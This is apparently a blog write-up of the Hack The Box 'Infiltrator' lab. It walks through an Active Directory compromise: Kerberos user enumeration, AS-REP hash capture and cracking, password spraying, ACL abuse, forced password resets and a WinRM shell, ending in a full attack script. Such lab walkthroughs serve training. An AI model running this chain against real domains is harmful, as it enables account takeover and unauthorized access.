---
layout: post
title: "Infiltrator HTB writeup"
subtitle: "Walkethrough for the Infiltrator HTB machine."
date: 2024-09-06 23:45:13
background: '/img/posts/04.jpg'

---

## Report

Beginning with  the default nmap scan 

  ```bash
  nmap $ip -sV
  ```
  We get an active directory environment  
  <br/> 
<img src="/img/infiltrator_screenshots/Pasted image 20240906155200.png" alt="1" style="width:700px; height:auto;">
<br/> 

A domain name can be identified `infiltrator.htb`.  

Adding it to the `/etc/hosts` file.  

We are welcomed with an index page  

<br/> 
<img src="/img/infiltrator_screenshots/Pasted image 20240906160931.png" alt="1" style="width:700px; height:auto;">
<br/> 

Following our standard methodology, source code lead us to nowhere.  
Here we can see some potential usernames

<br/> 
<img src="/img/infiltrator_screenshots/Pasted image 20240906163306.png" alt="1" style="width:700px; height:auto;">
<br/> 

Adding them to a list.

<br/> 
<img src="/img/infiltrator_screenshots/Pasted image 20240906163801.png" alt="1" style="width:700px; height:auto;">
<br/> 

Using this tool, will make some changes to the usernames to try to match it with the convention active directory usernames  

```bash
 /opt/CTF-bash-tools/scripts/ctf-wordlist-names.sh userList
```
We get some formatted usernames.

<br/> 
<img src="/img/infiltrator_screenshots/Pasted image 20240906165139.png" alt="1" style="width:700px; height:auto;">
<br/> 

Trying to brute force for potential usernames 

```bash
kerbrute userenum  -d infiltrator.htb --dc $ip formatted_name_wordlist.txt
```

We get valid usernames 

<br/> 
<img src="/img/infiltrator_screenshots/Pasted image 20240906170100.png" alt="1" style="width:700px; height:auto;">
<br/> 

Saving them into a list  

<br/> 
<img src="/img/infiltrator_screenshots/Pasted image 20240906170410.png" alt="1" style="width:700px; height:auto;">
<br/>

As we can see, `l.clark` is an `ASREProstable` user. `Kerbrute` captured its hash.  
For some reason, the hash we captured using this tool is wrong so we will get help from another tool called `GetNPUsers` from the `impacket scripts`. 

```bash
impacket-GetNPUsers  infiltrator.htb/ -no-pass -dc-ip $ip -usersfile Valid_users
```

And we get a valid hash for `l.clark` user.

<br/> 
<img src="/img/infiltrator_screenshots/Pasted image 20240906173314.png" alt="1" style="width:700px; height:auto;">
<br/>

Cracking it using `hashcat` with mode `18200`. 

```bash
hashcat -m 18200 l_clark_hash /usr/share/wordlists/rockyou.txt
```

We get the valid credentials `l.clark:WAT?watismypass!`.

<br/> 
<img src="/img/infiltrator_screenshots/Pasted image 20240906175209.png" alt="1" style="width:700px; height:auto;">
<br/>

Now checking for potential password reuse  

```bash
 poetry run  crackmapexec  smb $ip -u ~/infiltrator/Valid_users -p "WAT?watismypass\!"  'infiltrator.htb' --continue-on-success
 ```
 
 And we get a hit. 
 
 <br/> 
<img src="/img/infiltrator_screenshots/Pasted image 20240906192928.png" alt="1" style="width:700px; height:auto;">
<br/>

We found 2 users `d.anderson` and `m.harris` with same password as `l.clark` but we get `STATUS_ACCOUNT_RESTRICTION` error.  
The reason behind those erros are:
1. **Account Lockout**: The account may be locked due to multiple failed login attempts. Account lockout policies are in place to protect against brute-force attacks.
    
2. **Password Expiration**: The account password might have expired. Users are generally required to change their passwords periodically based on the organization's policy.
    
3. **User Account Disabled**: The account may have been disabled by an administrator. Disabled accounts cannot log in until they are re-enabled.
    
4. **Account Restrictions**: There might be logon restrictions applied to the account, such as limitations on the time of day or the type of computer from which the account can be used.
    
5. **Expired User Account**: The account may have an expiration date that has passed. This means the account is no longer valid.
    
6. **Group Policy Restrictions**: Group policies may enforce certain restrictions or settings that affect user accounts, such as requiring additional security measures.
    
7. **License Restrictions**: In environments with licensing requirements (like certain versions of Windows Server or specific editions), an account might be restricted if it’s not properly licensed.  
  
  Now we can use `bloodhound` to enumerate further.  
  
   ```bash
  bloodhound-python -u 'l.clark' -p 'WAT?watismypass!' -dc infiltrator.htb -d infiltrator.htb -ns $ip --use-ldap --zip -c ALL
  ```
  
  We get some information.
  
  <br/> 
<img src="/img/infiltrator_screenshots/Pasted image 20240906201800.png" alt="1" style="width:700px; height:auto;">
<br/>

We can view them using `sharphound`.

<br/> 
<img src="/img/infiltrator_screenshots/Pasted image 20240906204826.png" alt="1" style="width:700px; height:auto;">
<br/>

We get a potential attack vector

1. `d.anderson` has `GenericAll` on `MARKETING DIGITAL` 
2. `e.rodriguez` is a member of `MARKETING DIGITAL`
3. `e.rodriguez` can add himself to `CHIEFS MARKETING`
4. members of `CHIEFS MARKETING` can `ForceChangePassword` for `m.harris`
5. `m.harris` can finally `PsRemote` to the domain

Lets begin the attack vector. Since we know that the password of `d.anderson` is valid, we can try to request a `TGT` instead of signing in.

```bash
impacket-getTGT -dc-ip $ip infiltrator.htb/d.anderson:$pass
```

We save the ticket. 

<br/> 
<img src="/img/infiltrator_screenshots/Pasted image 20240906210639.png" alt="1" style="width:700px; height:auto;">
<br/>
<br/> 
<img src="/img/infiltrator_screenshots/Pasted image 20240906211044.png" alt="1" style="width:700px; height:auto;">
<br/>

Using `dacledit.py` to give `d.anderson` full control over the `MARKETING DIGITAL` group.  

```bash
python3 dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'd.anderson' -target-dn 'OU=MARKETING DIGITAL,
DC=INFILTRATOR,DC=HTB' 'infiltrator.htb/d.anderson' -k -no-pass -dc-ip $ip
```

We get a hit.

<br/> 
<img src="/img/infiltrator_screenshots/Pasted image 20240906221336.png" alt="1" style="width:700px; height:auto;">
<br/>

Now we can, according to the attack vector, have control over `e.rodriguez` so we will make him change his password to be able to full control him.  

```bash
python3 /opt/bloodyAD/bloodyAD.py --host "dc01.infiltrator.htb" -d infiltrator.htb --kerberos --dc-ip $ip -u 'd.anderson' -p $pass  set password "e.rodriguez" "Xtromera?123"
```

We can see a successful message

<br/> 
<img src="/img/infiltrator_screenshots/Pasted image 20240906222909.png" alt="1" style="width:700px; height:auto;">
<br/>

Now getting a TGT for the new user `e.rodriguez`.  

```bash
impacket-getTGT -dc-ip $ip infiltrator.htb/e.rodriguez:$pass1
```

We get the ticket and export it.  

<br/> 
<img src="/img/infiltrator_screenshots/Pasted image 20240906223113.png" alt="1" style="width:700px; height:auto;">
<br/>

Now make `e.rodriguez` add himself to `CHIEFS MARKETING` group.  

```bash
python3 /opt/bloodyAD/bloodyAD.py --host "dc01.infiltrator.htb" -d infiltrator.htb --kerberos --dc-ip $ip -u 'e.rodriguez' add g
roupMember "CN=CHIEFS MARKETING,CN=USERS,DC=INFILTRATOR,DC=HTB" e.rodriguez
```

The user was added successfully.  

<br/> 
<img src="/img/infiltrator_screenshots/Pasted image 20240906223525.png" alt="1" style="width:700px; height:auto;">
<br/>

Now we will force `m.harris` to change his password.  

```bash
python3 /opt/bloodyAD/bloodyAD.py --host "dc01.infiltrator.htb" -d "infiltrator.htb" --kerberos --dc-ip $dcip -u "e.rodriguez" -p "Xtromera?123" set password "m.harris" "Xtromera?1234"
```

Changed successfully. 

<br/> 
<img src="/img/infiltrator_screenshots/Pasted image 20240906231213.png" alt="1" style="width:700px; height:auto;">
<br/>

When I tried to make everything manual and in multiple commands, I was getting a lot of errors and had to restart the whole process from the beginning so a friend suggested to make a script for it.  

```bash
dcip=10.10.11.31

impacket-getTGT infiltrator.htb/d.anderson:'WAT?watismypass!' -dc-ip $dcip

export KRB5CCNAME=d.anderson.ccache
source venv/bin/activate;
python3 dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'd.anderson' -target-dn 'OU=MARKETING DIGITAL,DC=INFILTRATOR,DC=HTB' 'infiltrator.htb/d.anderson' -k -no-pass -dc-ip $dcip
deactivate;

python3 /opt/bloodyAD/bloodyAD.py --host "dc01.infiltrator.htb" -d "infiltrator.htb" --kerberos --dc-ip $dcip -u "d.anderson" -p "WAT?watismypass!" set password "e.rodriguez" "Xtromera?123"

impacket-getTGT infiltrator.htb/"e.rodriguez":"Xtromera?123" -dc-ip $dcip

export KRB5CCNAME=e.rodriguez.ccache
python3 /opt/bloodyAD/bloodyAD.py --host "dc01.infiltrator.htb" -d "infiltrator.htb" --dc-ip $dcip -u e.rodriguez -k add groupMember "CN=CHIEFS MARKETING,CN=USERS,DC=INFILTRATOR,DC=HTB" e.rodriguez

python3 /opt/bloodyAD/bloodyAD.py --host "dc01.infiltrator.htb" -d "infiltrator.htb" --kerberos --dc-ip $dcip -u "e.rodriguez" -p "Xtromera?123" set password "m.harris" "Xtromera?1234"

impacket-getTGT infiltrator.htb/m.harris:'Xtromera?1234'

KRB5CCNAME=m.harris.ccache evil-winrm -i dc01.infiltrator.htb -u "m.harris" -r INFILTRATOR.HTB
```

Doing so , we get an error at the end.

<br/> 
<img src="/img/infiltrator_screenshots/Pasted image 20240906231609.png" alt="1" style="width:700px; height:auto;">
<br/>

To solve this error, we need to add some lines to our `/etc/krb5.conf` file.  

```bash
[libdefaults]
    default_realm = INFILTRATOR.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = false
    forwardable = true

[realms]
    INFILTRATOR.HTB = {
        kdc = dc01.infiltrator.htb
        admin_server = dc01.infiltrator.htb
    }

[domain_realm]
    .infiltrator.htb = INFILTRATOR.HTB
    infiltrator.htb = INFILTRATOR.HTB
```

Doing so, we get a valid session.

<br/> 
<img src="/img/infiltrator_screenshots/Pasted image 20240906232143.png" alt="1" style="width:700px; height:auto;">
<br/>
